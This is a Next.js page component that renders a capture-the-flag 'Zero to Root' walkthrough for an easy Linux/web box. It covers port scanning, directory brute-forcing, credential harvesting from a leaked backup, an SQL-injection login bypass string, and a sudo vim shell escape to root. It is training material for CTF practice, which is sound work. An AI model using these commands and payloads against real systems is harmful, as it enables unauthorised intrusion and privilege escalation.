import Link from "next/link";
import WalkthroughStep from "@/components/WalkthroughStep";

export const metadata = { title: "Zero to Root — Full Walkthrough — CTF Arsenal" };

export default function ZeroToRoot() {
  return (
    <div className="max-w-3xl">
      <div className="mb-1 text-xs text-[var(--text-faint)]">Boot2Root</div>
      <h1 className="mb-3 text-2xl font-semibold">Zero to Root — Full Walkthrough</h1>
      <p className="mb-8 text-sm text-[var(--text-dim)]">
        This is an illustrative training run through <strong>one</strong> representative easy-medium Linux/web-box
        pattern — not a guarantee that the real box matches it. When the real target diverges (and it probably will
        somewhere), jump to the relevant topic page linked at each step instead of forcing this exact path.
      </p>

      <div className="space-y-5">
        <WalkthroughStep
          step="Step 1"
          title="Confirm target is up"
          why="Confirms VPN/IP before spending time scanning."
          command="ping -c 1 TARGET_IP"
          expectedOutput={"PING 10.10.11.50 (10.10.11.50) 56(84) bytes of data.\n64 bytes from 10.10.11.50: icmp_seq=1 ttl=63 time=24.1 ms\n\n--- 10.10.11.50 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss"}
          next="Reply, 0% loss → Step 2. No reply (some CTF hosts block ICMP) → scan anyway with nmap -Pn."
        />

        <WalkthroughStep
          step="Step 2"
          title="Full port scan"
          why="Finds every open port, including high ones a quick scan misses."
          command="nmap -p- --min-rate=1000 -oN full-tcp.nmap TARGET_IP"
          expectedOutput={"PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n33060/tcp open  unknown"}
          next="Note every open port → Step 3."
        />

        <WalkthroughStep
          step="Step 3"
          title="Version/script scan on found ports"
          why="IDs exact software/versions — this is what you'll searchsploit."
          command="nmap -p22,80 -sC -sV -oN targeted.nmap TARGET_IP"
          expectedOutput={"22/tcp open  ssh   OpenSSH 8.9p1\n80/tcp open  http  Apache httpd 2.4.52\n|_http-title: Welcome"}
          next={
            <>
              Run Step 3b, then: web port found → Step 4. SMB (445) found → jump to the{" "}
              <a href="#smb-first-path" className="text-[var(--accent)] hover:underline">SMB-first path</a> below.
              Neither → see{" "}
              <Link href="/b2r/other-b2r" className="text-[var(--accent)] hover:underline">Other B2R Topics</Link>{" "}
              or{" "}
              <Link href="/b2r/credential-attacks" className="text-[var(--accent)] hover:underline">Credential Attacks</Link>.
            </>
          }
        />

        <WalkthroughStep
          step="Step 3b"
          title="Look up known exploits"
          why="Check for a known public exploit for the exact version found before trying manual techniques."
          command="searchsploit SERVICE VERSION   # e.g. searchsploit apache 2.4.52"
          expectedOutput={"Apache 2.4.49 - Path Traversal & RCE | multiple/webapps/50383.py"}
          next="Hit found → read the exploit code before running it blindly. Nothing found → continue to Step 4."
        />

        <WalkthroughStep
          step="Step 4"
          title="Enumerate the web app"
          why="Finds hidden paths not linked from the homepage."
          command="gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak"
          expectedOutput={"/admin                (Status: 200)\n/login.php            (Status: 200)\n/backup.zip           (Status: 200)"}
          next="Found a backup/config file → Step 5a. Found a login form → Step 5b."
        />

        <WalkthroughStep
          step="Step 5a-i"
          title="Download the found backup"
          why="Backup/config leaks are a classic easy-box credential source."
          command="curl -o backup.zip http://TARGET_IP/backup.zip"
          expectedOutput={"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n100 18423  100 18423    0     0  91234      0 --:--:-- --:--:-- --:--:-- 91234"}
          next="If the file is tiny/HTML, it's a 404 page not a real zip — go back to Step 4 and try a different found path."
        />

        <WalkthroughStep
          step="Step 5a-ii"
          title="Extract the backup"
          why="Unpacks the archive so its files can be searched."
          command="unzip backup.zip"
          expectedOutput={"Archive:  backup.zip\n  inflating: config.php\n  inflating: index.php"}
          next="Fails with 'not a zip file' → the curl step above downloaded an error page, not the real file."
        />

        <WalkthroughStep
          step="Step 5a-iii"
          title="Search the extracted files for credentials"
          why="Hardcoded credentials in config files are the usual payoff."
          command={'grep -riE "password|secret|api_key" .'}
          expectedOutput={"config.php:   $db_user = 'admin';\nconfig.php:   $db_pass = 'Sup3rSecret!';"}
          next="Step 6."
        />

        <WalkthroughStep
          step="Step 5b"
          title="Test the login for SQLi"
          why="Classic auth-bypass test for logins that concatenate input into SQL."
          command={"Username: admin' OR '1'='1'-- -   Password: anything"}
          expectedOutput={"Logged in as admin. — OR —\nYou have an error in your SQL syntax near '''1'='1''-- -...'"}
          next={
            <>
              Logged in, or a SQL error confirming injection → escalate with sqlmap, see{" "}
              <Link href="/b2r/web-exploitation/sql-injection-basics" className="text-[var(--accent)] hover:underline">
                SQL Injection Basics
              </Link>
              . Either way → Step 6.
            </>
          }
        />

        <WalkthroughStep
          step="Step 6"
          title="Get a shell"
          why="Turn the credential or injection primitive into interactive access."
          command="ssh founduser@TARGET_IP"
          expectedOutput={"founduser@target:~$"}
          next={
            <>
              Low-privilege shell prompt → Step 7. Access is web-only (no SSH creds) → use the{" "}
              <Link href="/b2r/initial-access/reverse-shells" className="text-[var(--accent)] hover:underline">
                Reverse Shells
              </Link>{" "}
              page instead.
            </>
          }
        />

        <WalkthroughStep
          step="Step 7"
          title="Enumerate for privesc"
          why="Covers the two most common easy-box privesc paths at once."
          command={"sudo -l\nfind / -perm -4000 -type f 2>/dev/null"}
          expectedOutput={"User founduser may run the following commands:\n    (ALL) NOPASSWD: /usr/bin/vim\n\n/usr/bin/find\n/usr/local/bin/backup"}
          next="Step 8 with whichever came back — a NOPASSWD binary, or an unusual SUID binary."
        />

        <WalkthroughStep
          step="Step 8"
          title="Escalate"
          why="GTFOBins documents a shell-escape/escalation technique for almost every commonly-abused binary."
          command="sudo vim -c ':!/bin/sh'"
          expectedOutput={"# id\nuid=0(root) gid=0(root) groups=0(root)"}
          next={
            <>
              Root shell (id shows uid=0) → Step 9. If it&apos;s a SUID binary instead of a sudo rule, look up that exact
              binary on the{" "}
              <Link href="/b2r/privesc-linux" className="text-[var(--accent)] hover:underline">
                Linux Privilege Escalation
              </Link>{" "}
              pages.
            </>
          }
        />

        <WalkthroughStep
          step="Step 9"
          title="Grab the flag"
          why="The actual objective."
          command="cat /root/root.txt"
          expectedOutput={"HTB{illustrative_sample_flag_not_real}"}
          next="Confirm the actual filename/location and CTFd flag format at check-in before assuming this — then submit to CTFd."
        />
      </div>

      <div id="smb-first-path" className="mt-8 rounded-md border p-4" style={{ borderColor: "var(--border)" }}>
        <h2 className="mb-2 text-sm font-semibold uppercase tracking-wide text-[var(--accent)]">
          ⎇ SMB-first path (branch from Step 3)
        </h2>
        <p className="mb-3 text-sm text-[var(--text-dim)]">
          If port 445/139 turns up instead of (or alongside) a web app, condense the chain through the existing SMB
          page rather than repeating full enumeration detail here:
        </p>
        <ol className="list-inside list-decimal space-y-1.5 text-sm">
          <li>
            Null-session enumerate shares/users —{" "}
            <Link href="/b2r/enumeration/smb-enumeration" className="text-[var(--accent)] hover:underline">
              full SMB Enumeration page
            </Link>
            .
          </li>
          <li>Pull every reachable share file; grep for credentials/config/scripts.</li>
          <li>Found creds? Try them against SSH, FTP, and any web login found earlier before assuming the share itself holds the flag.</li>
          <li>Authenticated → Step 6 above (shell) → Step 7 (privesc enumeration) → Step 8 (escalate) → Step 9 (flag).</li>
        </ol>
      </div>

      <div className="mt-8 rounded-md border p-4 text-sm" style={{ borderColor: "var(--border)" }}>
        Stuck somewhere this path doesn&apos;t match the real box?{" "}
        <Link href="/b2r/when-the-playbook-doesnt-work" className="text-[var(--accent)] hover:underline">
          When the playbook doesn&apos;t work →
        </Link>
      </div>
    </div>
  );
}
